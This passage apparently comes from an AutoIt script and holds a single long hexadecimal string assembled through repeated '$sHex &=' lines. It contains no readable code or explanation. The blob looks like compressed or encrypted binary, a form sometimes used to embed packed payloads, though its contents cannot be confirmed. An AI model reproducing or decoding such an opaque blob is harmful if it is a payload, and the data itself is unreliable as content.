58D436015FFC99A9232A7A940566235E037DC40BBE982D054754A719103934A3808D734484A13D59FA0F0296169138B0BF293714E5027A8540E8368C9534C45E0607E1A35D577F875CD5107795F203D420FEA6B960423616C8D97A06C28981D1B3EF05BD0C3EB50A317B18DF11270805B345569E0721083C010FF8A105A63BE7573811864688D1FF812386A1157499D34329E730C723417141479A05C414D04D5BCF3824A72F45304F26138F5A9EB84FFA14F05700DF0E1381B704B0D11AE71ED914B9DFCB2D57141C74651B5BB5F109A342B66071A0AFABED5747F2DBB80D6486CC010A7EB127D304AF09B807A74428F1113EB5095F9AD3569BB7E0F5C57F26D0C041D02A1554528C1B1FA84D65F4958B42E26BE3599BD1C8B0875A308FDC538825A635740480B19F83670DCAD9C1321FBC9113B80451C1D1CD06FD710D7F0D039B6745A18A12C0CA87056EBAA6400EC5E49505E503CC9793C4CAD03E3262159A523E00539A9415FA519A70484C3F01C99010D85047C3C30E4AA300BF8266E7AA29345A6F073E82D87960A4882027C"
    $sHex &= "1D0CE837132D0D7FC101024BF056C77F622E7EE66F9DF4474FBC74037C1A1018504E1547400F43372C88AB0C08091C055F1C5D73B04EE0010DC8F40310CA48ECF4AAE4C0E21471BFFA0032B5F4411D0EADA4D4D612C21289655BB174E8110A595E03116C21B467507E2D516355C072F4E1D7525328E5C34DF02BE8C39DC00915EC912D8C6D0CF72F27809D7F5C3ED86F6E24BEE0EB6502753E3842173035C9F4E9BE074BDE87BF25C3143B0EB87C1B464461335C5618C70DA932F4982715280C25E1E4E7BE863C6DDF97EB15DB7AD0510BB5311FF119928F340887C0F4FAF448DB91EB104FECB88406D4DC919E88D8D2E90EE8BF16A63AEA103103959BD023092E0C805DEB5587533B1171C10F2D51CA54EB532BF89016D2D86C51B70C685C1738F8EF995586CC28CA76C9A1F037858B0352E4426C61C9F8E7430220A3A3C977E82BB13142892BD291346645120C2500941A911D3712175CD7048D14C115E646B19EACCCF0B2E151775D043F8F3879E18251ABBBE08964A1236B8FFE6F11B5CBF292B5587F60D604D0B879774E133A81FA594226C6908357C01D8A566E7BEC173B88B57E122788898A18E0585244257120B18D34F72128302ECA5BA529501301357FC14270AA74D5789B094A2211EFBFC3B96D15E177A176B88C0918B177FF8CAD654823DE8F04B0013E94C3DBB57F13C0690F6BD7C7308118096C9776071FFB9198A13BF4907DC30968362EF8CB5C5C02DD5C63D8D788D3D0C545E0830C346628CDD9C78666C89A0E2BB6C11C4322994B0FEC186A2830C799609BA15558B3CF56B851BB20DC5D4AF8A1574B13D1502B0E3014039BDD2914AA086C01319301E68B51D4BF007C2779D145E1017E026C1CA6C22C68BC082DBAFE97818B2912276BD21C81C2DC90463458B9E41506021FBC008D378B98E4F945C419F805A867FE1D7D265DD8585A03F803C603E969A6C78AA630D4C3C388AC4A041E6C9CF4FF127E90A080418B95AF1FF20E5FEA2B89954C0F87684407810B097F9FF884B1B2CD70CD58346CA23BA19487DF3D17EC149FC07943A9BC17C64068D303864904570F1A78DC530575B47FAE2D5069AC4378ECAD552D607D04C52A6E83FC4AC6920AC0A8000080717F47E45101009E22533E81D2C8BF3C535BED96411CD3C6E0DA08953484E2D36FC6C1B64A837181A29190D9DB865006F40AA5B8261B1B7A6B6FB3A167C1672EB8C71A3F019EBC1BC2FE0C1A045B4152FCD067E5504F0A8606E88806E1F0825ADC070F8521DCFFF4BE1734A175EFA8348E0637E0B071FA995AF84BC6EF5DE85ED4015B6D0F8A844DB87D03CD8CE0DDEA683B41F2824B12AF5F888C67E028234E2588DB8B602A00FB8B027A8AB907DC4960A15C83D1DF517C9B70201D6C075215CC554FC134"
    $sHex &= "34B056C6851E1D075B147E549DF06DF56B243B117C1FD3B03B3776C844DD0FC0B083E9073A76C2666D986C732B401B12C518C19180BB67BD135269800994740537C8560018420779525B030627E3290110700C2B9FC970211D395014D9EEBF77218DD6312BA0137DF438CDD41089EB5AA7A8F9BDC98529F3E50C0142BA83057B1CCBB08E1D81E007D11D1725AD2E3049C8A4A6DD5D0B399E402E9C9CCA0714984DDA9C87F085A19C128D95687974DD14C415851D5044C6C670AE288883550D0C7C3B2F552D118DF13E45AF6C53D99027891D0A59E75A899C19525B38ACE22A61A00EA43F4DA44F6E8A0DD2A052D58D4B5885C17B6672695E929F1BC07636B581B11F99F7D8EF69CD08D079F35FEB48B0F74B556510B7AF83038B6413AB0C0F181C27CA8D2DAA093C0287B30F2A011109FE7E408AA1F4E9EE0A7F0680B54632D1058BE2D121625C5A73486110B4E33FDAFF0023CAB1AD0149FFE411F1578745750E6560DD9D488876BF23DF0C1B38DD850B5DA8DD753DE375213D5DB4282C9F32FE29E1DC45A8E7E435184D8D4D3784044A4EED68B85F8578586408199906C0509221E408C82048778AA605F00C8DD060210548E0F34967AE366D100332A40B7C3A410C7E19BE40D3F1149E709904BCF93C6BA045440B1733300C2574A284C80B89DE4724BC951D038D1770BB07C25C5A85176BC0CB4BD802CD942BF9500C5A0A168DDD5B29AA646EAFC07BDB0BA37B2F1F6DC3088A191F48BD2A768664649900D880E950E2C0995C29C0490AAB86032F8E14AC68701A66734A5C5072C9855C40AB4A93A9DD533B006F19652EAC326C36DB2F0001C86706C4F3C77EC54A98D95DD8C63DF8470005020401FCEC28E405010D0205030504BDE10A485F500FAAECA0DB19130D0C55CE790974A453D82021B15C879F20EC7FEB78C9687466E0BA45A1168F6A42CF9C070C5454B2166131A4015F56F3CC81ED2C5C374C7F0B21B061B3D7911E34766D7B1028C1259C10B5360B982EBF8D9FB5810997B83BD28E0130102AE45381D13A8C706DE0EC2388291CC9F0F48BF29125D07477AC1C924F6BC59798F8037293905F300890693B08D3D05F281C5182EDC50E300F007423BEA0136CA60E161FEE68562312AD61DC2D10EE5D245E2A674DD8FDA0B621A9D81B55D84AD042403C9713DF6DD0BA6571790CDE45F09C31A0EE000706A570DC4D9B1AECF018CFB0C07678A1611F7BDEC93E9A1CDD41102F68C115217A09278497A92A98286D290CAC77EA234AA074004C5F2809D68A69EC607353F9DD2B1367ADAD9CD535BCD91B513FF4DD59102EEB4ADDB336B5225A181900204050DBC4C68E2152C251241D2F26558C9C9F6A40B724B3B5E5AE2C3B3F44C19374483201724C72A48BA18EEC3F4CFC6801EB"
    $sHex &= "288310A70535F54B227F761492068DFC9967D91B520A1642DD223611C7DF3D40694A7C93630DD2208725B1BC0CB3539BDA6C251071144B18831C36251C71F3EC28180C36252C2566123511405F10111B49BDC30847C26E524EFA6D6C08289FC4A844323301D78033219108B809B8A0322915944342E3F19E24EC659D0A83EBE57B8582BBB45BD86A107D9F69D75B786F877176A1A69C726750BDF4898895C026024F7FEF8D76D21B1B48481D69B56BE093DC0C350985AA2FE3811C7C132BDF441C5EAD109C8527AB65FA2696E71900BD3C7DC28193D636CF970B03A674CF1C7CCB4EE9E028A8B06DFB7CF046AE0C27959F0C825678EB2962B65AFE0B209D2ADE8A440816880432EBC5B483FDF94D1CC60402628F422A4DC04222FB08001985564D20145F7F028B640CB87B2CE090470410F8CE5622D613193401ECA68D040B6137761B9852ABED7FA43A4867E9535A120F97D6939C85691EEC2A4965C3782679118CC434395B901774DCF04A663EE800080F9DADD5D4D909E8D46662B551FD21000B683BEBFD4656661A9D28FD45DFA2EC10BA7D23FDB0012D659C869636C4A29E04F0FEC5FA2CAC047475C4C021CBA01FC4AE3BAF5934DE463D3F20D750186466F056966E386689119518884802D73504D2655A63F03EF011564E820411009D8CB3531A9CC1C36A9C3E490A03ADD8750F30E821E048A9064E84C6D239421CA235105D1DBF0811501C4317AA2D3E1163D5A21519CDDF6624D6004DBB33148C25B3663316303456FC4C4DE22DA5FBBAC0035E58594C4585348401736A302330A381DDDBA35A8970C041CDF8EA43906B1ED51B404B69F1E322C43BC9CC2DCD1E7447028148D2B5C24BBED6FA3F30266F6115F0FF3DE7F0903182C5294B580D1737E40AFBA98386C04FC9498B3F432F62FE5527420A22740CDA954608A05B6075269BDC726760F69641E0216D69C2A669CA40A05A11BFB702232C5F9A6B9D355F6A6898143D660807D5BC5D462227ADD8A764A2D0425B0C780CFB7A8F9BFCE55A2817188CC14BC3B928142CE0C321420C71FCE0D3B1F822EB4186F44D481C34CC23E3B6402EF43F0C21AC4D5B15F4BCDB2948AFF80BB40B512C10897AC0B2D38992C7C83A8CC4926B37CBC60A117F6E0E21DDDADA7C082BD18310E714860F14032D580B63FE7D980B0ECDF70668640A0D018C641274D108A5AD307E8A55E0AF4511BF0A58D3D9C1BA03100FE2E189B606F04D16D25E28BA02278DC302BF8503067E1DC28677C67ED78F0311811E41E497E420CDC92BECC745D4ECE470294073D4D452E8DC0D4034A61FF099EC800702860FF44B3D7AC5BD0EF61ED10F8DB6A7DC1C03BF04208FAA47F97EA6351AE8ED150355E8F3D8EE11C0A5D019F731F1CC6762F9D0D003FF34B2DB"
    $sHex &= "03268ACA884A1F1760F9B1F882109AEF1C8F002E0C7FBD636FC14EE6A02B012F9E3A893AB289DC57C2808029D40AB7CBE283C1249FD0D8DEE388D005E8D0668D87DA1A219F7D44A3C068DAE30DF2BD02A614101410B7D8298C622886DA1E34B0DAFA5302C1C9B796FEE5034A482310D875B075F4BC3BF007E989C1BC208842667856180FC50DE00A7D0A7A01F61B632B8627F0F8C2554962E00703CEF0528D1509F7448D952A439CDCCD784CC0442BA1034E14014C616F0B0F193CA85180B826E3E5563236B74F55423CDEA0F1B497B65EF0180E9659AA9A50179F240919F942C1E20240420E99904014343342296934B96F680938607FA9C09F04B712D3111103405D2A034D667F2A091CA8A01EE8FEFFFF01A947302751DD997866ED3C4450270C3AC3A781ABA3F8D62B2A0E59194EF829DB6FE8E0714411D7A6F79AEF1F848E540810EBC4B14C5D51E4BE864183EA6D304C254FBB82A1CA48010E900179107F4C4CD0037040C74094FF337090C60F5838028F6B7294F4600B974A6055082CDFD153556C2D8C27AF12500164FFC7D898B46D9200C81912CCA3C84E4DBF68F0852905B82248ED552712C4C27D83B8888522F14569B18194915D596332FD36FCF7DC18206D43312BED452CFD44A5EABC26BF6A28F91C30845E741CF71D5650FA89AF05EF900815229F8905D4A7B8B26A24E931934801B381082331A8436D2A31717225AD197A9952AEE3CD276D356973BA21FFDF43090E6A8B4190417AD314240F561DD4C3FF1F6A457C32A47523671D81D8B4D3E36BA52B4C5DEC306734168BBAA8714065044D9D20FF431E2C16F192152393B3B6EA94BCF37F7F019502B900FDC62B2932B4118941D852E1467FAF23800BC9C36B0F88D4003BEB1D7B280C0808E5042CBF08D4AE31A319421696B995F4694D5A81BA751F5F0493A93D29BF75088FDC4AA8D236D24F406A10B51A5A0DF5DDA91166140D40790C8556D8F405F84B4409CFB03E6989485992F94B0274083BD17E09102589CEE9083FC265C0808EB11237B027FB5C52F980D2E386E1E14A90959DAD0D521AF607382D08F46704BFFCA9111792D95490061D48E98006B0F4610912D204D010D50F132F53AAF00FD067025B218D4EB39E842B0D003B42F274869F080588258500DA144ACD44A3DF0B73DC2C62D711AC297567976CB7899B49A70ED1E0699FC415E50805AC4530C32DB3B0FB1470188991E06C800D89A9210E130505560209E6DDA2833550A35B4B7F2060C03208321D27F134170E2223174FCA2A334F050BBD1E274878A1662D1121B73C655C6C85097BD116C3E858811F438830C504F4A08F6EE2349740FCEFE33B862302177FB1278C7112B7D6AB24ACA08B77216D5DC381FCFFB07C6D2CE26CF73E6B13A58DE15CEF"
    $sHex &= "EB1395E17924A30507B7911991BA5BFF48DD8D91AAD43CE0D402D1E05085B1A114C9CC5ED2B3D1560354D86BFAC45F0BF5E395EB24D24026005E5083D06B0C5A5A4B8E74D484053CC4DFEBE58081EC461758BA173B6EFA404FA397B1E4F7E4520C35C06A0127BD9736362EFA0CE41367BC20F5408377039B10292CB2BA929583CF91CFE012EC050CA32D743742405A46E0D628581B7E042B1082BC845A6135186EC0740F8FF54BC489FA40BC3B6E2F6183B083DF33CC50BD0A2C159FDCD45225B53CC8C050E6B1F23C23373AC80108C8D8DC09C18C15B0C9CDF14CFBD87F2FE8716109EB85B75BBA9026DD65051DDF03D66225AD3CD2DA4497CB1059B88EC476C4C166C0A03C7BB920DA8383E18D44C60002E459D4ECC12A06436A97171AD3081DE067ECDDE4BA3AB3ECD9EC17E8B4A4064C7FA5388C8DD48138A73511183BD7C51E3067072139AC43C641AAC2603C6AE6B037168CD7937405513C8614EF12304263EFC64A48E99173CA2DE2515F49090C606D68E2052A23E5B028C319A16EE69AE4AC13BF0E0675075AB0255E0F05FF10003FE40557582529BBB97CD8DE0156FB0B8841104F8F5490864D282371393296406C505431A154882DB07F2BD088106E18744C68088097DEF8035BBAE15E2BECB1E3E81602B98C41791BE969F4507A141173BADA7828ADC6FD18B3A3A554355BC110F90CC2214E01181AAB2C0DED691471D4386EDF0C4C91A808713AB8002EAF351AF8A351D7968C841413D004F81B7A1E0C3B0277811ACE968CF1F8C1BCA526CFB0FCFC5A9B085C560C1F009516A31F79FCBA2980376F453F602B0C46EB37F1118BF56446C0B9F6B9A30F52BB5C872C82A5E88139BBEE3562A149C9FFC1AAEF26AB20771C5B198810885817B2B5509761BF5E87B7D6889B4165D1F5C4089683AE03BBC480E042D5AD80894A4CDFC122586962BB7B41C0AAFAC0A7BF919618A886149B7D268D484DEF231BF87918C79237EB384CB90A74A30FA99C0D07853F566DC44541F908EBC06824B4631FB6B1A8801DF590827C3B3F1D1600C709E15FC9A691B19C7A14945552D34BBB805792DAA5ED53EFEB966BFF186A149E899118D7D66C3579625D96F74DDA21EB4448E3C003D25A7FC10A7242189BDE86ABD1E21E39E67633167021EC571E27C024A418E6211A0B208E800B2F1FF52436988717FC1564BBE0E6EF123DE727A9C7C06675DF53DAAEF4A3482BC2D11450FD230CA0EEF3F839E2E030F015694D0289A1A82B4FA4D403A4A7CE5570A575DEAD7AC8D8C1E33603A4A7E24951317C5AEF9ED00BDA6EE7CA1C30048E3582AF1F555C1520C603625BDFD84920351BB378C1B0D809F230C676A81FAD19D6843D816BE85A4C08C276695DD3FA5D19422016AC44A8EB53E3A38DCF046DEB"
    $sHex &= "BB5B4CC0211FDB33EC6DE121E520819376D048DB71B834241A42076A8660164B6EDF179EC24449180BC89783B282B4EEAC1D0A37CDC2CA8F10287078D902BB4BDDA4A7A0E18F0C3B41100F8C7800EF7529D7C6E301F9D83797BD15AF10B481927F87916E818C488063D2DC27B30AD899740413CA2918689ECF0E4314E8EC5B97241AEFEC7F04BDE90A9AE8761ADFA76C60203D5B7FEABBB970E9A03ED5FD5D58D4C0C17E994888368349C89A7CB8184D31B30CD9AA0DC7EFBB7DF50E073F704ACD15F7E480D6F50A31EB2C3D487B323086DC0C919A1A0B6B9BE285C20F507F1D7C1E6A1D94463C24B84A19ED07B01D0E109E2466DC79016134AB15494B702C2B417F73C00083F1E9591DC061699C4F5F4D6B4CD8032C3E12C0B1413FA342573828ACF9531B074D816DC1A914738706A5A5B5C74C848642BF101A015361B7C23201E9E1AA3FB802101CA3A1C59F038090682F155258AC12780C017D77F10A9AEFECB36DA6F4F9125B1C6A085B181243686918636C15DE32C263814603230C14C33B56800B5278BF8091AB989FECECABCAC02149D5AE088B0E7CEA8818807DFE1AFF81DB1A821C14493B148875E8A83FB7AAEBD14B458D148DEAA0D24228B55C9152A637C96E44EFBC3BAFC04263CEBD8899AB7B5F44D058273B822F39213C94DC81170102A05740E9463F5657400D0C17B3DC5193D034C214430CF3CA4E4B35201B2B5514C65A8EA7202959CC4DE358BBFE81C2F3260DF8D5A05C50100E8D54A9EF5DC260DFB848DFF387524A622D4B7A1661A1607F53431B374A23ECB9C26861DC132433EC6EA842872DDA8D028DF1693434532DF032F44BBA3514FC9EC20A4E814F841321ACE98A992F3E6DA14573A05E05EB67563B5FA6EC0824F3545A08D520E897E80C08AE692160BB50C595C0A2EDE8BF2340E4FBDBD40B86FD4804409D8137809C95E8056C0B5332305F5E65A5B13AFF9A28018515B825C5E7FA1B0F46C17F013B91F446C1810B1514813ADC69E21855579CD070781953F74680C301F55CED6E564A57B757EC0FEA060B2B6BDFEC88EAB06E49AF4B08D864B0314DE30B785D57DF2051D11C7E081A7185DF0C6024DC41751450BE29A28E4C1D023907AB0174721F02B7B2029180BF82558C294FD36A1868350DEBB3EA51E2090FD6BF4F306A03F147029614D4142F2B0309AD029D0BB05DA12C1F51F314DA6A12ADE7A1878C2720FB03A38DC4407FE5DCA1A6122F0590D210B108084B05F348F8B1F7C86D15102D733D173EA85603211D3DC93C9DF65B1F7DD60401234114AE5E2EF9251802282C03AFB668C500158B1A19C425560C172F8501B4ABC6D1906192CF30D8EA2C1E4A01C30DCFF4930A096E043914A9B822DF2A360C2602065723EF118131AC4D42D57F6C6B84"
    $sHex &= "544A94B18040AF4D4B2B3016FC410267E0461710FD95A3E50594DB7402B2B64B4036111B9C74F707D55010EB45FA36BD702D8599B11683205ADD88F2B44F5FF0EBE4657625E037F73688D5046ECEB84D8D20859780AC318FB34BC02AC4415E1D870FA1989F734D65716441A422ABDC407908B8C59DFC85B424928E5826ED83402B0D3E046C067519CF64B7C29672553F53276011F5CF14411E6FB90E02A7089B25A5531FC3DC1442B1E9A19F0FFF95E842CC201FE2881DD237E9F90D6AA3729DC6567D3B3627D72D700671EFF23154602B28CA7B7B39B543B1D0D29484AF4100F54661060C56330B97D659431FA841E3182DA487968BF021CDD197C3764375D7EF5CF01901E0294EF4BD6482D088ABBDDF1C3DFE44BDFB0D7B85C97EE828A330C512B338BE03E9A497810040A7585BA7B6E551955B0A82865166687C19D54CBDE6F4421A01A3F08108B8D9628D55016197CAB100FCF4E81F47C111910C64DFE896901E307D042E6B5F3960247F2B619BD62BB8413DD84815B09EB0DE921723182FC2947CCD1414AB3030D3947D73C348511688501617B0342294665834170C0CFA344CB5784D1206F01C6670097C9811B1E16324BEA4EC990230CC0639A45D8D38101C5639C883431C2F20F82CF437C30620FF28288B492C89482CAA384068599D10FF4814BFE414FC706A10A5D2431A3B6F3BFF089778699105A40DF17A7D49791812D3D59BB8A9F845C00C7B0B1430C02143BB9C5C4560DBF41B6CECD495F455E8E93A9EFF60875401311C1A784CF75B9729E971F835F4F8F48ED23225F8265B9B6A3A040C0C390D0000F04253E9510ED4E839B6BE1B1010E5BD266D58B30DBF75096BB4F5FD45E183D05390CAEEA45B4CAC25F3250C68886885FB75F06C7C213B51220013406B0D8B6D976662C9416915DD67602776EB132993ACC7400A56A38110B39F5517C1E125CC43141BD7010FB21FDEFE01FD37940507C158112C3199686DCF011FE1C75AC872950C55493D14679D9597F1E3D4334BA40950101DBEB13C531113010C7319DB15DD7A50141D94A95B0F139CDF55E13B19FEC1112B1918AA80D7FC13B18623F3195555486085C33F66EBB862BBFCE7564ACC5B31063C9D4EC7CBC6AA14BF9D212D999FF85744C2013C0BD1619BA900877B8A3A39D9B82E1BCA2D2811ABA977873C52B550630947770A3E01F73311F954081CEBBE4C16E8D434CC6813FDBAE926DE96C27407896201E9444C6255CF5F8E5A45208FC28B8C1506817785766E58E10439247DB8A9E507F924F190C02AE2CB5737C609A93414EB575A1052487F82417E9313D6CC19F0D702B04F1E8845F70FC4BF3EF4B94400237436E3205CC1B203C031B1415A8EA628D2731589F60379B524EBDAEB786BA4D21BAC50716024"
    $sHex &= "F13AB0D614B7268FE41D58D51091ABFC81C2B3B053EB870AB7C6C797EB9FB9F788482924316ABD3F84B7D6A928CD9F65EA82780F40BC9A8D8E5F8514884268BF7F1F5E1976AC7B33DB441EB590B8015FDE0C6A130B7928FFA4123AC2B18C20034220C1A33FB4B0BD15338FB310070330E82B241C0C8670919831381FEC39318758BC502700D4BC60C3E00D1701BA21038B20C401BFB495781AC30C10A6B904E9B644CB8DD37F621040BAA0DC42A58101E98B38379C0CD02F0AD33B0247019842804AFFFC34168E335824A08855FB5BD0BA08BB2E4DACD0ECB3E4C8E07CB14B183B01DFAC2220D14809DF5F6A02ED547E15F554E95C17B416011F23DB1A110ADF90C39D5ED97F538D04957F8BF565EDFF7B35519A2251031052CF2C7CD73F02044F5400C20A4F7410884761488C2146350D3C88E4902C60AD5A1B67190B818108D9AC6DA50F93A73C91BA301DAF80466A36501D1FD1B0B48152CF6D2670709F02DF08692CB45FA2A4CA180D42BC3F87C680749E1460C5198A771BDC0F8E6E016B067E1D1B8037673071003C16BB5C8F7987601ACD0AED05F0862B20F02D9D564FBA2513A06E385B8FD693C49402F83419665837C11D49F8A604F2F306F14FC06E1B8B521889DB0A95A540EB24BE0D58DD659D25967156221C1077AF25FE761B86F010F883C096493410DDB6B47A471078358A035FF0457E75060C168944166C2722F59930ED4034240A18DEB65C7E6118FC4336104341FC0833837C0110214434361158AF204D0868EC04E61C528F9C3C3430EFF460A25D207A59E6871F245C52211597F03DF8C10B55286E074F7B0AE64B5828EBC1973142593F9F5671D9469841383873C87349E196324060B080506986E5E516A6A41D431F1350E14BF081E108FC4061F10B6983C9068CF35A467659957194C4148E00252102E9254C42132CFB2416D662D72F595F9FD67907109135715F1B47203A37AD2D0E03FF0D26C790BF0CE90D22804708CB717424340A6AF5B1862BA4215CD34708E7A507E1142332D496F822CFE94761711B278923A251244A216736DCB09216471C71A404C001753BE4F82CAC876B4366F7BC06F528DD3AC9517A318868AFDF18B981C6DDE98011A431A4A58727A1487132D1C9ECF863A8DA9467003B25E480B7D519F8F31BF10A593E1866E076E61D1074751868761F3088290CB7F9F8F52D65558D38C9234825D4A555EE4C1342D84F9E8195C64E7C1484D8478A56047E68650B306B24660A5FCB1907E2571C43D4C6A0772276CA4850201AEC013E6897E8744FC9E83A8385030C8C0B7529225297BC5D366EB59F54FD53292D6DFF9C189A6485CD2DB5FAD06EA5C01117251757CF2701F34914E892CDE992C2D2D95159143E640D2A53ADB426D588107F1AB851B0"
    $sHex &= "5353EC69BD4079F5E8AC1551F4E346CA5DE49305C812C914E6B44472F0E19418E75A3A8E88472F8081E4DE56EB220C722E34E42072281D2E61690BD2771F10E4902BC80AA5E06A230A6AC62250A9E44823C8071DA41E9FF4FF077457F84905075CCFBC1DABE307C6487C3F7772F3202A9EF8C2F4FDCA1DD605183FF40460315991002929982E5D8CD77D40E3763AA236780430B343F03D1CB585472814888B04014C4D9C0C910CD2EA85336A29065FD603D021114D913F60B90F6A0D6D9186142B97D6CF137DF3328B9B0B4F138260B29640839D5232A4731703415260AA433009120AD850629F2C72058D08E7A2B0887215F1818CC08380ED03454004A184D639208EC5E74ED6334DE51483C28503A7F53B500C736D7C62687D408DFD70F730540A52F3912B5A950E01E8F815605DA135DFA31D01788275FD5D782A139F78A768CE0F22CD647D430FDFE98B9783E1439174EDEC14843BD453ECB814F1C13A52F8E1F8F94640E38B4F444808CF040CD48EE381F10593F417F42B02C5CF0DDC6C7FEC326CF374407C5A9B7A761D8D85277CA32031DFE09631BC4F6510B4D2006BB1080C58898B78740DBD2585A61EB95F0802100F61141E997A8139AE76710C4CA66E4B6847F8B1CAD485F88F18932B3832B6085891A9771F448AC764EABD55C7EB790685A6CEC1EB84DB18C885A6D70B9926532981BBFC1F10C726FCF312EF7C73812832BE07640FF1B639350CAD70D16A1B9A1AA5A50179B7D21A1E87AC948A95F46FE1C7013E0F821C512BA3A999DD34F552700FD3E159A3E4A017F00C3582471E7CADE98422CD10A1B0874AA36502FD6AECF5E32B28307D732A9FF0C600B0344FCADE02A83112D4A1790283DFA209EB9AA38D49038E75241EC5C64E5C8F2FBDDC8205ADDFF193BC6A2A9F5002B08D0B02E8C6853F4AED054761F0E010444057FB7E48683910CC95344A83BD0B5E67E697148B131925745AC2E3BE26BAC7852C1C01C94F5B4885745502898573C5DABE5B1A87128D6153701D149E1140950F5D0A1B1EE86DA378B8BFB561A60223F3A67169DED411B867B9D8198042E64FB02C2A056F7B717D6BC8338AE7EEFBFF0D8845E38A4DE3888D4F168A950B8895464A7B73693A46CFCF884DB7664529DB82838BF3FEC4FD0A8B85DCCDBA61B68911BD0B107741F94382139411CE022424DAAB24D90CDEB701EB2E0ACFBB34ED6D28C6B3101F4F162E6C76695AE31C103307D701821543B7F00FAC22899D72DB89BC67FF18C7854800A4F4849E2D2A754724F8D93B3F86148B5514433A4F7D12092927302352195E7BF680E10F99EB429F307C39111CBCEB3A397F5C955D6BD20A8B0FDF81D661E6D083BE81E754BD832B513E0A4F1781A914959DFCAF7C052B8A4938A5A6434DD334CD"
    $sHex &= "8B55C25545488DCA092E9738380E301158454F2DF60F69A384B7209FF952A01D25BCD95883E2D93B78BEEB0A5D01896C754C336D35A5683E65491EE32D464844EE3B94A2CD242E11044447B5B5F0B16B46603FD0BE29770283D00A7DD0177D4DD1B50A25702C06A4825739413D457D3B75365306C018029DBC2640B9681C4858FEF35327BA9DA4288A5103ECB5EBB145063420C6A47D7AFC362A4F3836161102E6360C4962072F24E672697A752AC0C0012B18EF96C00B0F0F87CA8658F034B98D19248D38C94E34166C6F1F41179572DDDA00A78D3DDC20E76D8B669008F8203550FCDE2446C6B30661455485EC3985B588E5F6579AA6A9B0514E3AC0454DDF5D2C6941450B007F2A7C09B0342B1D9C20731F204604004FA443D70DE9E09B76E22DEB358B118D921B6F0C83C4D4CF0E7E4F537A3E2BEB158446828AFB5B2120EB040A6464B2E481009795D2FA2108C8FB06F751F8B82CBEEB3B763EE0BB17D119E533D2E2D6EB17A111B4839D5130C0397973FD07240B4DDC7507C300E4336E08E61832363CE5017CFA55652BC839877D9B12C481FCE2278533406AC6F9C2898598ADEA547D85EAC783FA10608DFE687C2DF3DC50D706F68C8277F7D0581C8D0B047D3A3F4ADBEE5D1A353E1C21525055D99DB2C3B8FDEFBCFD170175131006E972C11DCC141C8D243C4AEA138A9047FCF9091AC6AB2E1F0C450D884DACA263196FCC94E82D8ED3F16804C5343E189F982CDD51081418DB0A1680DE1D663589DA29EE8C3C84698A04D8D8187B244769D85227101F3A7D87FA44E19BF677B172060ED8A98D45AD2BA5B2F4F065855CB55BD46A1026091207F51605116C6CE1F0EF44E8CCC60130EBE0D114313172B41D8A248811904F5ECB04EF0705054C53B905BCB0719A580C780CFE9870A78B10E80BC873ED36628D130EC0950DC6166A04DB1B2BCCEBC271061EF9D4D75C6908DD42F8BA6A031C02A1C7066BBBC0E30BA5008717A7FB490F43C045C0D9E07839358E55D32315A5EE6BF9D69818E37E0F8B7D117358870CB3ACE35D9A6A63B0B898BFE2B8AD000FD7AD982CD768E3A8853250042DAE09A5120636BE44247588248F08EA45C0A20B428CE4C648308FE0C114E20321AB050F0EC137C08A22BEF790D37A207B705F910C5E2C7F179A0188C65640BD842F2010EBD000E70AF95F8078AE90B7A5AAE45F77C098C33C20508667BF784F8E600CF30D80E908DE6CB42BD9D9E845CAF3EA014879BD55DDD37E3F2D36ED191C971D34EB19224DF92BA767A0413C291044EA1E8E50110F858D855002285F2D4D454C8D484A30186874033C60C8A9303021742ECCB0828BE315D19101029BAEE33F463554817B46F98885473178FC3FE18F1F30E43B497E093903EB3700F585160F181104E7"
    $sHex &= "09B32F02C047251A2E02780375470660D2D58803F0F840A90020D18427E82AF853BAFB0B0AE30BD1AAD76F5186AB878A4EDE77AF219DE8737D2DC60030EA4CC15249C134DEBDB1F42BF0C57C238DD1B950289440C07A00FB8CB58B636A3EE8CD66CED8F62DE8D8D7BF98022E31048798C077EB18CF4265E2B9AD11CB62045F0B09DF333B604D6656A51E114A8142C05E18954C6B0EF9528D45C0504D0177C4E78291033647592F5180A17E5AA1303C306830D8C3599CE35C25E29F12DF2E75287447C361DA582B0FBFEAA880DEA73300B0F70C104B5B1DA3F184856FB0C06781BD5A8A81C21F9A87ED4A87DCE419432DE124C625E4A60475FA0D99752B5A647C2A920C666D006F94EBC8775A4B3740530A41D3DC5637C245102BB4D3E71BED008D8D2F2BC11AE793E14EC6455587A447C3CF4AC33D6D9967E8B728B70760671C9CB70F8D6CEEE2960A0F76898508711DAD9803156A040304F748D2EBEC11560B3B51A3ACBD9F84492B8D6DE40345560A0B258D0C1098B7E3B685D579BF083111158C1DA156779C30BAE06790C3F911EBCA1F4D092442E4054D898D40AB372F5D0D18C3AFC663252BFE0133122126B13C57BD73A11E346D337C0706D28C3A0E0138FBC0C4533B1958D08A8D69879169F78C056BEBDA5FF6E88F00DB07DF710E064F1500800363316337D102ACF80508BCEB12BDAA2110EA7007750636601544A646A52E99D9357A84629AB70F03B5B89886EA07DD7AA2C480335489EDFF08591CEA0F37AEC2228895F37843C319A621F428337690E5544C0F9D85002082E01E2D0BE6E05643474D0BF685B448196E035570486C1750120942AECC13912D7141565C2D5CFCFD12BC9C79F8DAF8FD721E0F19A79C5CE310C8E8E80A85384F7BF04268F4031A110E12DCF38895E7FD850D8E69E341D6148D23AB3B0B761F6F1EDFA911EB9787F6E24CC87518B0D30A17762E05670086B0EC8F670B486F8BF1421E2B7DF006001C8D81BD01CE1AC10BD52C6C178EC2B026B3BCD50CD10725368909093D9682491BEAE0D6EC43C7FB20CC032BC8F3466C7893E68808E011ACF8FDEF04E4921705F8FD951F1E2295A13B957DB0C47BB06B68815D9C5AE577E55D09D185E70282E065A4E14D11AA95855CDA41C2D084628D95833769B811CCE011BA804C4BC12192915BF36001632C3FACC704D5E9118251DC190BC2D9E5DC1F8C11413AC74D3C31B5ED698A9DEB3395A9D012EE618003D4C30B4B1BA9503EEED00830D8EFF119700B2A2A6A28259FCA36125FF935C1D90582581F527942044FC5C8A45049C6B732686D0336931DEE6135FC8DCC010BD2132B61983311EFEED49D404F1B5D147BDA0F0482230F7498957772D95C5595C8C885113C19DB023399D3D6977129F133854097A15C"
